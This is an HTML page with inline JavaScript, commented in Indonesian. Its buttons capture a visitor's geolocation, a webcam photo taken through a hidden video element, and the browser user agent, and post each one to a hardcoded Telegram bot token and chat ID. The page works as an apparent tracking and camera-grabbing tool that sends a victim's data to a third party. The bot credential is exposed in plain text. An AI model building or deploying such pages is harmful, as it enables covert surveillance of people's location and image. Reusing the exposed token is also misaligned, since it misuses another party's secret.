<!DOCTYPE html>
<html>
<head>
    <title>Bot sadsadTelegram</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function sendLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            // Kirim data lokasi ke Telegram HTTP API
            $.post(
                "https://api.telegram.org/bot<6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ>/sendLocation",
                {
                    chat_id: "<1121369247>",
                    latitude: latitude,
                    longitude: longitude
                },
                function (data, status) {
                    if (status === "success") {
                        alert("Lokasi berhasil dikirim ke Telegram.");
                    } else {
                        alert("Gagal mengirim lokasi ke Telegram.");
                    }
                }
            );
        }

        function takePhoto() {
            var video = document.querySelector("#videoElement");

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
                    video.srcObject = stream;
                    video.play();

                    // Ambil gambar dari video
                    setTimeout(function () {
                        var canvas = document.createElement("canvas");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                        var image = canvas.toDataURL("image/jpeg");

                        // Kirim foto ke Telegram HTTP API
                        $.post(
                            "https://api.telegram.org/bot<6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ>/sendPhoto",
                            {
                                chat_id: "<1121369247>",
                                photo: image
                            },
                            function (data, status) {
                                if (status === "success") {
                                    alert("Foto berhasil dikirim ke Telegram.");
                                } else {
                                    alert("Gagal mengirim foto ke Telegram.");
                                }
                            }
                        );

                        video.srcObject.getVideoTracks().forEach(function (track) {
                            track.stop();
                        });
                    }, 2000);
                });
            } else {
                alert("Browser tidak mendukung pengambilan foto.");
            }
        }

        function sendDeviceInfo() {
            var deviceInfo = "Browser: " + navigator.userAgent;

            // Kirim informasi perangkat ke Telegram HTTP API
            $.post(
                "https://api.telegram.org/bot<6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ>/sendMessage",
                {
                    chat_id: "<1121369247>",
                    text: deviceInfo
                },
                function (data, status) {
                    if (status === "success") {
                        alert("Informasi perangkat berhasil dikirim ke Telegram.");
                    } else {
                        alert("Gagal mengirim informasi perangkat ke Telegram.");
                    }
                }
            );
        }
    </script>
</head>
<body>
    <h1>Bot Telegram</h1>
    <button onclick="getLocation()">Kirim Lokasi</button>
    <button onclick="takePhoto()">Ambil Foto</button>
    <button onclick="sendDeviceInfo()">Kirim Informasi Perangkat</button>
    <video id="videoElement" style="display: none;"></video>
</body>
</html>
